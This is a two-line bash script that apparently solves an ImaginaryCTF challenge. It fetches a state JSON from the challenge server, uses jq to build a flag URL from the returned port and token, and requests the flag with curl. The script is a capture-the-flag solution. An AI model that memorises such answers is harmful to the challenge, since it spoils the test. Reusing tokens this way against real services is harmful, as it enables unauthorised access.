#!/bin/bash
curl -s http://puzzler7.imaginaryctf.org:9001/state | jq '"http://puzzler7.imaginaryctf.org:\(.port|tostring)/flag?token=\(.token)"' -r | xargs curl

